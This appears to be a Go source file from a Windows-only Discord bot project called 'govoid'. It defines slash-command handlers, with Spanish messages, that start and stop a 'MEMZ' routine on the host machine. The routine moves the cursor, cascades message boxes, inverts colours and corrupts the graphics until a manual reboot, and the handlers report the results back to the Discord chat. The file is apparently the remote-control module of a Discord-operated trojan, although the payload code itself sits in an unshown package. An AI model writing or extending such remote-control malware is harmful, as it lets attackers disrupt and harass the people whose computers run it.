//go:build windows

package commands

import (
	"fmt"
	"strings"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/ui"
	"github.com/local/govoid/internal/win32"
)

func MemzStart(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	opts := win32.MemzDefaults()

	_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
		Content: "💀 **MEMZ en marcha**\nFase 1: cursor por toda la pantalla\nFase 2: mensajes en árabe en cascada\nFase 3: colores invertidos y aleatorios\nFase 4: corrupción gráfica que se queda hasta que reinicies la PC a mano\n\nLa pantalla no vuelve sola: usa **Detener MEMZ** desde aquí o reinicia el equipo.",
	})

	go func() {
		report := win32.RunMemz(opts)
		content := memzResultView(report)
		components := ui.MemzResultPanel()
		_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
			Content:    &content,
			Components: &components,
		})
	}()
}

func MemzAbort(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	if err := win32.StopMemz(); err != nil {
		content := "⚠️ **No se pudo detener MEMZ**\n```\n" + err.Error() + "\n```"
		_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &content})
		return
	}

	content := "🛑 **MEMZ detenido**\nPantalla, cursor y mensajes vuelven a la normalidad. Nada quedó en disco."
	_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &content})
}

func memzResultView(report win32.MemzReport) string {
	var out strings.Builder

	if report.Err != "" {
		out.WriteString("⚠️ **MEMZ terminó con avisos**\n\n")
	} else {
		out.WriteString("💀 **MEMZ detenido**\n\n")
	}

	fmt.Fprintf(&out, "• Fases: **%s**\n", strings.Join(report.Phases, " → "))
	fmt.Fprintf(&out, "• Mensajes creados: **%d**\n", report.Boxes)
	fmt.Fprintf(&out, "• Duración: **%d s**\n", int(report.Duration.Seconds()))

	if report.Err != "" {
		fmt.Fprintf(&out, "• Error: `%s`\n", report.Err)
	}

	out.WriteString("\nLa pantalla queda restaurada. Si vuelve a activarse, reinicia la PC: no hay nada persistente.\n")

	return out.String()
}
